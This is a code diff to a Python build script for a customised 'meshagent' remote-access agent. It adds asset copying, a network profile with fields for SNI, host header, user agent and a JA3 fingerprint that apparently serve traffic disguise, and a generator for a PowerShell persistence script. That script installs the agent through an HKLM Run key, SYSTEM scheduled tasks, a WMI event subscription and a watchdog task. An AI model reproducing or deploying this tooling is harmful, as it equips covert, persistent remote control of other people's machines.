@@ -11,13 +11,16 @@ from __future__ import annotations
 import argparse
 import json
 import pathlib
+import shutil
 import subprocess
+import textwrap
 import sys
 from typing import Any, Dict
 
 ROOT = pathlib.Path(__file__).resolve().parents[2]
 CONFIG_DIR = ROOT / "custom_meshagent" / "configs"
 PATCH_DIR = ROOT / "custom_meshagent" / "src" / "meshagent" / "patches"
+BUILD_GENERATED = ROOT / "custom_meshagent" / "build" / "meshagent" / "generated"
 
 
 def load_config(path: pathlib.Path) -> Dict[str, Any]:
@@ -28,6 +31,15 @@ def load_config(path: pathlib.Path) -> Dict[str, Any]:
         parent_data.update({k: v for k, v in data.items() if k != "inheritFrom"})
         return parent_data
     return data
+
+
+def resolve_asset(base: pathlib.Path, value: str | None) -> pathlib.Path | None:
+    if not value:
+        return None
+    candidate = pathlib.Path(value)
+    if not candidate.is_absolute():
+        candidate = (base.parent / value).resolve()
+    return candidate if candidate.exists() else None
 
 
 def run_command(cmd: list[str], cwd: pathlib.Path | None = None) -> None:
@@ -116,11 +128,111 @@ def write_branding_header(config: Dict[str, Any], output: pathlib.Path) -> None:
 
 
 def cmd_generate(args: argparse.Namespace) -> None:
-    config = load_config(CONFIG_DIR / args.config)
+    config_path = (CONFIG_DIR / args.config).resolve()
+    config = load_config(config_path)
     meshagent_root = pathlib.Path(args.meshagent_root).resolve()
     header_dir = meshagent_root / "meshcore" / "generated"
     header_dir.mkdir(parents=True, exist_ok=True)
     write_branding_header(config, header_dir / "meshagent_branding.h")
+    copy_icon_asset(config, meshagent_root, config_path)
+    write_network_profile(config, BUILD_GENERATED / "network_profile.json")
+    write_persistence_script(config, BUILD_GENERATED / "persistence.ps1")
+
+
+def copy_icon_asset(config: Dict[str, Any], meshagent_root: pathlib.Path, config_path: pathlib.Path) -> None:
+    branding = config.get("branding", {})
+    icon_path = resolve_asset(config_path, branding.get("icon"))
+    if icon_path is None:
+        return
+    dest_dir = meshagent_root / "meshservice" / "generated"
+    dest_dir.mkdir(parents=True, exist_ok=True)
+    dest = dest_dir / icon_path.name
+    shutil.copy2(icon_path, dest)
+    print(f"[meshagent-build] copied icon -> {dest}")
+
+
+def write_network_profile(config: Dict[str, Any], destination: pathlib.Path) -> None:
+    destination.parent.mkdir(parents=True, exist_ok=True)
+    network = config.get("network", {})
+    payload = {
+        "primaryEndpoint": network.get("primaryEndpoint"),
+        "sni": network.get("sni"),
+        "hostHeader": network.get("hostHeader"),
+        "alpn": network.get("alpn"),
+        "userAgent": network.get("userAgent"),
+        "ja3": network.get("ja3"),
+        "useIpOnly": network.get("useIpOnly", False),
+    }
+    destination.write_text(json.dumps(payload, indent=2), encoding="utf-8")
+    print(f"[meshagent-build] wrote network profile -> {destination}")
+
+
+def write_persistence_script(config: Dict[str, Any], destination: pathlib.Path) -> None:
+    destination.parent.mkdir(parents=True, exist_ok=True)
+    branding = config.get("branding", {})
+    persistence = config.get("persistence", {})
+    binary_name = branding.get("binaryName", "meshagent.exe")
+    install_root = branding.get("installRoot", "C:/Program Files/Mesh Agent")
+    service_name = branding.get("serviceName", "Mesh Agent") or "Mesh Agent"
+    task_conf = persistence.get("scheduledTask", {})
+    watchdog = persistence.get("watchdog", {})
+
+    script = textwrap.dedent(f"""
+        # Requires administrative privileges.
+        Param(
+            [string]$InstallRoot = "{install_root}",
+            [string]$BinaryName = "{binary_name}"
+        )
+
+        $BinaryPath = Join-Path $InstallRoot $BinaryName
+
+        Write-Host "[persistence] Using binary $BinaryPath"
+
+        if ({str(persistence.get('runKey', False)).lower()}) {{
+            Write-Host "[persistence] configuring Run key"
+            New-Item -Path "HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Force | Out-Null
+            New-ItemProperty -Path "HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "{service_name}" -Value ('"' + $BinaryPath + '" --service') -PropertyType String -Force | Out-Null
+        }}
+
+        if ({str(task_conf.get('enabled', False)).lower()}) {{
+            Write-Host "[persistence] configuring scheduled task"
+            $taskName = "{task_conf.get('name', service_name)}"
+            $trigger = "{task_conf.get('trigger', 'ONLOGON')}"
+            schtasks /Create /TN $taskName /TR ('"' + $BinaryPath + '" --service') /SC $trigger /RL HIGHEST /RU SYSTEM /F | Out-Null
+        }}
+
+        if ({str(persistence.get('wmi', {}).get('enabled', False)).lower()}) {{
+            Write-Host "[persistence] configuring WMI event subscription"
+            $filterName = "{service_name}_Filter"
+            $consumerName = "{service_name}_Consumer"
+            $query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_ComputerShutdownEvent'"
+            $commandLine = '"' + $BinaryPath + '" --service'
+            $namespace = "root\\subscription"
+
+            $existingFilter = Get-WmiObject __EventFilter -Namespace $namespace -Filter "Name='$filterName'" -ErrorAction SilentlyContinue
+            if ($null -eq $existingFilter) {{
+                $filter = Set-WmiInstance -Class __EventFilter -Namespace $namespace -Arguments @{{Name=$filterName; Query=$query; QueryLanguage='WQL'; EventNamespace='root\\cimv2'}}
+            }} else {{ $filter = $existingFilter }}
+
+            $existingConsumer = Get-WmiObject CommandLineEventConsumer -Namespace $namespace -Filter "Name='$consumerName'" -ErrorAction SilentlyContinue
+            if ($null -eq $existingConsumer) {{
+                $consumer = Set-WmiInstance -Namespace $namespace -Class CommandLineEventConsumer -Arguments @{{Name=$consumerName; CommandLineTemplate=$commandLine}}
+            }} else {{ $consumer = $existingConsumer }}
+
+            Set-WmiInstance -Namespace $namespace -Class __FilterToConsumerBinding -Arguments @{{Filter=$filter; Consumer=$consumer}} | Out-Null
+        }}
+
+        if ({str(watchdog.get('enabled', False)).lower()}) {{
+            Write-Host "[persistence] configuring watchdog task"
+            $watchdogTask = "{service_name}_Watchdog"
+            $intervalSeconds = {max(60, int(watchdog.get('intervalSeconds', 300)))}
+            $intervalMinutes = [Math]::Max(1, [Math]::Floor($intervalSeconds / 60))
+            schtasks /Create /TN $watchdogTask /TR ('"' + $BinaryPath + '" --watchdog') /SC MINUTE /MO $intervalMinutes /RL HIGHEST /RU SYSTEM /F | Out-Null
+        }}
+    """)
+
+    destination.write_text(script, encoding="utf-8")
+    print(f"[meshagent-build] wrote persistence script -> {destination}")
 
 
 def build_parser() -> argparse.ArgumentParser:
